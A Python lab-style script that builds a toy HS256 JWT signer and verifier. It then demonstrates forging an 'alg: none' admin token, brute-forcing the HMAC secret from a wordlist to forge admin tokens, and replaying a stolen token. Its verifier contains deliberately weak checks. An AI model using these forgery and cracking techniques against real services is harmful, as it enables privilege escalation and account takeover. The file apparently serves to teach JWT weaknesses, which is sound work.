import json
import base64
import hmac
import hashlib
import time

#encoding
def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')


def base64url_decode(data):
    padding = b'=' * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def create_jwt(payload, secret):

    header = {
        "alg": "HS256",
        "typ": "JWT"
    }

    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())

    message = header_b64 + b'.' + payload_b64

    signature = hmac.new( # creating signature
        secret.encode(),
        message,
        hashlib.sha256
    ).digest()

    signature_b64 = base64url_encode(signature)

    token = message + b'.' + signature_b64

    return token.decode()





def verify_jwt(token, secret):

    header_b64, payload_b64, signature_b64 = token.split('.')

    #### none algo part
    header, payload, signature = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(header + "=="))
    #soln
    if header["alg"] != "HS256":
        raise Exception("Invalid algorithm")

    if header["alg"] == "none":
        print("Token accepted (no signature check)")

        return json.loads(base64.urlsafe_b64decode(payload + "=="))

    #### end first


    message = (header_b64 + "." + payload_b64).encode()

    expected_signature = hmac.new(
        secret.encode(),
        message,
        hashlib.sha256
    ).digest()

    expected_signature_b64 = base64url_encode(expected_signature)

    if expected_signature_b64.decode() != signature_b64:
        return "Invalid Token"


    payload = json.loads(base64url_decode(payload_b64.encode()))

    # checking expiration of token
    if "exp" in payload and payload["exp"] < int(time.time()) and payload["exp"] > 20:
        return "Token Expired"

    return payload






secret = "idk"

payload = {
    "user_id": 1,
    "role": "user",
    "exp": int(time.time()) + 3600
}

token = create_jwt(payload, secret)

print("\nTOKEN:", token)

print("\nVERIFY:", verify_jwt(token, secret))





header1 = {
    "alg": "none",
    "typ": "JWT"
}

payload1 = {
    "user_id": 1,
    "role": "admin"
}

header_b64 = base64url_encode(json.dumps(header1).encode())
payload_b64 = base64url_encode(json.dumps(payload1).encode())

token1 = header_b64 + b'.' + payload_b64 + b'.'

print("\n modified token ",token1.decode())
# print("\n",token1)



#input for token
# tok=input()
tok=token1.decode()
# print("\nVERIFY:", verify_jwt(tok, secret))





## 2nd Attack



token_bruteforce = token

header_b64, payload_b64, signature_b64 = token_bruteforce.split('.')

message = (header_b64 + "." + payload_b64).encode()
secret_bruteforce=""
with open("wordlist.txt", "r") as file:

    for line in file:
        secret_bruteforce = line.strip()

        signature = hmac.new(
            secret_bruteforce.encode(),
            message,
            hashlib.sha256
        ).digest()

        signature_test = base64url_encode(signature)

        print("Trying:", secret_bruteforce)
        flag=0
        if signature_test.decode() == signature_b64:
            print("Secret Found:", secret_bruteforce)
            flag=1
            break
        


# now we gor the key we perform the attack

payload = {
    "user_id": 1,
    "role": "admin",
    "exp": int(time.time()) + 3
}

token3rd = create_jwt(payload, secret_bruteforce) #using bruteforce secret key

if(flag!=1):
    print("\n \n not found so cannot auth")
else:    
    print("\nTOKEN:", token3rd)
    print("\nVerification output:", verify_jwt(token3rd, secret_bruteforce))




## 3rd when token was stolen and used for replay
# if HTTPS was not used "Wireshark ,MITM attack"
time.sleep(1)
print("\nREplay\nVerification output:", verify_jwt(token3rd, secret_bruteforce))



#token expire case

time.sleep(1)
print("\nToken not Expired\nVerification output:", verify_jwt(token3rd, secret_bruteforce))

time.sleep(2)


print("\nTK expired\nVerification output:", verify_jwt(token3rd, secret_bruteforce))







#comparision
print("\n\n==> Now Comparision :")
import time

payload = {
    "user_id": 1,
    "role": "admin",
    "exp": int(time.time()) + 20
}

start = time.time()


token = create_jwt(payload, secret)
verify_jwt(token, secret)
# print("\nVERIFY:", verify_jwt(token, secret))

print("Symmetric time:", (time.time() - start)*1000000)
